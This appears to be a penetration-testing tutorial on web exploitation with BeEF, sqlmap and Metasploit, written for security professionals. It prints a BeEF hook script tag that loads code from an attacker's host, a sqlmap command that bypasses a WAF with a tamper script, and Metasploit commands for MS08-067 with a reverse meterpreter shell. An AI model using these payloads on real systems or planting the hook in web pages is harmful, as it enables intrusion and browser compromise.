---
title: "Exploiting Web Vulnerabilities & Gaining Access: Taking Control with BeEF, sqlmap, and Metasploit"
description: "This tutorial explores advanced exploitation techniques for web vulnerabilities, focusing on using BeEF for browser exploitation, leveraging sqlmap tamper scripts for SQLi, and utilizing Metasploit for gaining initial access."
image: "https://armur-ai.github.io/armur-blog-pentest/images/security-fundamentals.png"
icon: "code"
draft: false
---

## Introduction

This tutorial delves into advanced exploitation techniques for web vulnerabilities, focusing on utilizing BeEF for browser exploitation through XSS, leveraging sqlmap tamper scripts for bypassing SQLi filters, and utilizing Metasploit for exploiting various vulnerabilities and gaining initial access to target systems.

### Exploiting XSS with BeEF

BeEF (The Browser Exploitation Framework) is a powerful tool for launching targeted attacks against web browsers. It utilizes XSS vulnerabilities to hook browsers and execute commands within the victim's context.

**Step 1: Install BeEF**

Follow the installation instructions on the BeEF website: [BeEF Installation](https://beefproject.com/)

**Step 2: Hooking Browsers**

Inject a BeEF hook into a vulnerable web page using an XSS payload.

**Example BeEF Hook:**

```html
<script src="http://your_beef_ip:3000/hook.js"></script>
```

**Step 3: Utilizing BeEF Modules**

Once a browser is hooked, you can use BeEF modules to gather information, execute commands, and launch further attacks.

**Example: Using the "Get Internal IP" Module**

Navigate to the hooked browser in the BeEF control panel and select the "Get Internal IP" module. This module retrieves the victim's internal IP address.

### Advanced SQLi Exploitation with sqlmap Tamper Scripts

sqlmap tamper scripts are used to bypass web application firewalls (WAFs) and other security measures that might block SQL injection attempts.

**Step 1: Identify WAF Rules**

Analyze the web application's responses to identify WAF rules that are blocking your SQLi payloads.

**Step 2: Select Appropriate Tamper Scripts**

Choose sqlmap tamper scripts that are designed to bypass the specific WAF rules you've identified.

**Example: Using the "space2comment" Tamper Script**

The `space2comment` tamper script replaces spaces with comments to bypass WAFs that block spaces in SQL queries.

```bash
sqlmap -u "http://example.com/vulnerable_page?id=1" --tamper space2comment --dbs
```

### Leveraging Metasploit for Exploitation

Metasploit is a penetration testing framework that provides a vast collection of exploits, payloads, and auxiliary modules for exploiting various vulnerabilities.

**Step 1: Choose an Exploit**

Search for exploits that target the specific vulnerability you've identified in your target system.

**Example: Exploiting MS08-067**

MS08-067 is a vulnerability in the Microsoft Server service that allows remote code execution.

```bash
use exploit/windows/smb/ms08_067_netapi
```

**Step 2: Set Options**

Configure the exploit with the necessary options, such as the target IP address and payload.

**Example: Setting Options**

```bash
set RHOST 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
```

**Step 3: Execute the Exploit**

Run the exploit to attempt to gain access to the target system.

```bash
exploit
```

## Best Practices for Exploitation

* **Ethical Considerations:** Only exploit systems that you have permission to test.
* **Understand the Risks:** Exploitation can have serious consequences if not performed carefully.
* **Thorough Reconnaissance:** Gather as much information as possible about the target before attempting exploitation.
* **Verify Success:** Ensure that the exploit was successful and that you have gained the intended level of access.

## Conclusion

This tutorial explored advanced exploitation techniques for web vulnerabilities, including using BeEF for browser exploitation, leveraging sqlmap tamper scripts for SQLi, and utilizing Metasploit for gaining initial access. Mastering these techniques is crucial for penetration testers and security professionals to effectively assess and mitigate web application vulnerabilities. Remember to always adhere to ethical hacking principles and obtain proper authorization before conducting any penetration testing activities.